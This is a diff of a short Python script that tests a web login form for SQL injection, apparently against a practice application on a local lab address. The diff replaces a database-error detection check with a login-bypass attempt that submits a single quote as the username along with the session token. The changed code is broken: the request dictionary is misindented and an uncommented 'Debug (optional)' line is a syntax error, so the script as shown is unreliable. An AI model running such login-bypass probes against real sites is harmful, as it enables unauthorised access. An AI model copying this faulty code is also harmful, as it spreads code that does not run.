@@ -1,7 +1,7 @@
 import requests
 import re
 
-BASE_URL = "http://192.168.11.128:8888/"
+BASE_URL = "url"
 
 def get_token(session, url):
     res = session.get(url)
@@ -44,48 +44,29 @@ def sqli_bypass(session):
 
     payload = "'"
 
-    errors=[
-          "SQL syntax",
-            "mysql_fetch",
-            "ORA-",
-            "syntax error",
-            "unterminated",
-            "quoted string",
-            "PDOException"
-    ]
+    
 
-    # data = {
-    #     "username": payload,
-    #     "password": "anything",
-    #     "Login": "Login",
-    #     "user_token": token
-    # }
+     data = {
+     "username": payload,
+         "password": "anything",
+         "Login": "Login",
+         "user_token": token
+     }
 
-    data = {
-        "username": payload,
-        "password": "",
-        "Login": "Login",
-        "user_token": token
-    }
+    
 
     res = session.get(brute_url, params=data)
 
-    for error in errors:
-        if error.lower() in res.text.lower():
-            print(f"[Vulnerable] at {brute_url} with payload {payload}")
-            return True
-        else:
-            print(f"[NON_Vulnerable] at {brute_url}")
-            return False
+    
 
-    # if "Welcome to the password protected area" in res.text:
-    #     print("[SUCCESS] SQL Injection login bypass worked!")
-    # else:
-    #     print("[FAILED] Bypass did not work")
+    if "Welcome to the password protected area" in res.text:
+        print("[SUCCESS] SQL Injection login bypass worked!")
+    else:
+        print("[FAILED] Bypass did not work")
 
-    # Debug (optional)
-    # print("\n--- Response Snippet ---")
-    # print(res.text[:500])
+    Debug (optional)
+    print("\n--- Response Snippet ---")
+    print(res.text[:500])
 
 
 def main():
